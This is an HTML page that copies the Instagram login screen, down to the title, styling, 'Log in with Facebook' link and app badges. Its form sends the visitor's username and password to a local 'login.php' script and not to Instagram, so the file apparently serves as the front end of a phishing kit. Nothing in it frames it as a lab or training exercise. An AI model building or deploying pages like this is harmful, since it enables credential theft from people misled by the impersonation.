<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <link rel="icon"
        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📸</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .container {
            max-width: 350px;
            width: 100%;
        }

        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            text-align: center;
            margin-bottom: 10px;
        }

        .logo {
            font-size: 42px;
            font-weight: 400;
            margin-bottom: 30px;
            color: #262626;
            letter-spacing: -1px;
        }

        .input-group {
            margin-bottom: 6px;
        }

        .input-group input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            color: #262626;
            outline: none;
            transition: border-color 0.1s;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
            background: #fff;
        }

        .input-group input::placeholder {
            color: #8e8e8e;
        }

        .login-btn {
            width: 100%;
            padding: 7px;
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 12px;
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.1s;
        }

        .login-btn.active {
            opacity: 1;
        }

        .login-btn:hover {
            background: #0086dc;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0 22px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .divider::before {
            margin-right: 18px;
        }

        .divider::after {
            margin-left: 18px;
        }

        .fb-login-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 12px;
        }

        .fb-login-btn svg {
            width: 16px;
            height: 16px;
            fill: #385185;
        }

        .forgot-link {
            display: block;
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            font-size: 14px;
            color: #262626;
            margin-bottom: 10px;
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }

        .get-app {
            text-align: center;
            font-size: 14px;
            color: #262626;
        }

        .app-badges {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-top: 16px;
        }

        .app-badge {
            height: 40px;
        }

        @media (max-width: 450px) {
            .login-box {
                padding: 30px 20px 20px;
                border: none;
                background: transparent;
            }

            .signup-box {
                border: none;
                background: transparent;
            }

            body {
                background: #fff;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form action="login.php" method="POST" id="ig-form">
                <div class="input-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required
                        autofocus>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn active" id="ig-btn">Log in</button>
            </form>
            <div class="divider">OR</div>
            <a href="#" class="fb-login-btn">
                <svg viewBox="0 0 16 16">
                    <path
                        d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z" />
                </svg>
                Log in with Facebook
            </a>
            <a href="#" class="forgot-link">Forgot password?</a>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div class="get-app">
            <p>Get the app.</p>
            <div class="app-badges">
                <svg class="app-badge" viewBox="0 0 135 40" xmlns="http://www.w3.org/2000/svg">
                    <rect width="135" height="40" rx="6" fill="#000" /><text x="50%" y="55%" dominant-baseline="middle"
                        text-anchor="middle" fill="#fff" font-size="10" font-family="Arial">Download on the App
                        Store</text>
                </svg>
                <svg class="app-badge" viewBox="0 0 135 40" xmlns="http://www.w3.org/2000/svg">
                    <rect width="135" height="40" rx="6" fill="#000" /><text x="50%" y="55%" dominant-baseline="middle"
                        text-anchor="middle" fill="#fff" font-size="10" font-family="Arial">Get it on Google Play</text>
                </svg>
            </div>
        </div>
    </div>
</body>

</html>
